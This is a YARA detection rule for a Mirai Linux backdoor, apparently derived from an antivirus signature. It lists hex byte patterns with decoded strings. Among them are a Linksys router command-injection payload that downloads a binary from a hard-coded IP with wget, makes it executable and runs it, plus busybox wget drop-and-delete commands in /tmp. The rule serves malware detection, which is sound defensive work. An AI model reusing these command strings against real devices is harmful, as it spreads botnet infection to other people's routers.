
rule Backdoor_Linux_Mirai_Aa_MTB{
	meta:
		description = "Backdoor:Linux/Mirai.Aa!MTB,SIGNATURE_TYPE_ELFHSTR_EXT,03 00 03 00 06 00 00 01 00 "
		
	strings :
		$a_02_0 = {62 75 73 79 62 6f 78 20 77 67 65 74 20 2d 67 20 90 02 03 2e 90 02 03 2e 90 02 03 2e 90 02 03 20 2d 6c 20 2f 74 6d 70 2f 62 69 67 48 90 00 } //01 00 
		$a_02_1 = {2f 62 69 6e 73 2f 90 02 10 6d 69 70 73 3b 63 68 6d 6f 64 20 37 37 37 20 2f 74 6d 70 2f 62 69 67 48 90 00 } //01 00 
		$a_00_2 = {2f 74 6d 70 2f 62 69 67 48 20 68 75 61 77 65 69 2e 72 65 70 2e 6d 69 70 73 3b 72 6d 20 2d 72 66 20 2f 74 6d 70 2f 62 69 67 48 } //01 00  /tmp/bigH huawei.rep.mips;rm -rf /tmp/bigH
		$a_00_3 = {2f 74 6d 70 2f 62 69 67 48 20 72 65 70 2e 68 75 61 77 65 69 3b 72 6d 20 2d 72 66 20 2f 74 6d 70 2f 62 69 67 48 } //01 00  /tmp/bigH rep.huawei;rm -rf /tmp/bigH
		$a_00_4 = {74 74 63 70 5f 69 70 3d 2d 68 2b 25 36 30 63 64 2b 25 32 46 74 6d 70 25 33 42 2b 72 6d 2b 2d 72 66 2b 6d 70 73 6c 25 33 42 2b 77 67 65 74 2b 68 74 74 70 25 33 41 25 32 46 25 32 46 31 33 39 2e 35 39 2e 32 30 39 2e 32 30 34 25 32 46 62 69 6e 73 25 32 46 6d 70 73 6c 25 33 42 2b 63 68 6d 6f 64 2b 37 37 37 2b 6d 70 73 6c 25 33 42 2b 2e 25 32 46 6d 70 73 6c 2b 6c 69 6e 6b 73 79 73 25 36 30 26 61 63 74 69 6f 6e 3d 26 74 74 63 70 5f 6e 75 6d 3d 32 26 74 74 63 70 5f 73 69 7a 65 3d 32 26 73 75 62 6d 69 74 5f 62 75 74 74 6f 6e 3d 26 63 68 61 6e 67 65 5f 61 63 74 69 6f 6e 3d 26 63 6f 6d 6d 69 74 3d 30 26 53 74 61 72 74 45 50 49 3d 31 } //01 00  ttcp_ip=-h+%60cd+%2Ftmp%3B+rm+-rf+mpsl%3B+wget+http%3A%2F%2F139.59.209.204%2Fbins%2Fmpsl%3B+chmod+777+mpsl%3B+.%2Fmpsl+linksys%60&action=&ttcp_num=2&ttcp_size=2&submit_button=&change_action=&commit=0&StartEPI=1
		$a_00_5 = {53 65 6c 66 20 52 65 70 20 46 75 63 6b 69 6e 67 20 4e 65 54 69 53 20 61 6e 64 20 54 68 69 73 69 74 79 20 30 6e 20 55 72 20 46 75 43 6b 49 6e 47 20 46 6f 52 65 48 65 41 64 20 57 65 20 42 69 47 20 4c 33 33 54 20 48 61 78 45 72 53 } //00 00  Self Rep Fucking NeTiS and Thisity 0n Ur FuCkInG FoReHeAd We BiG L33T HaxErS
	condition:
		any of ($a_*)
 
}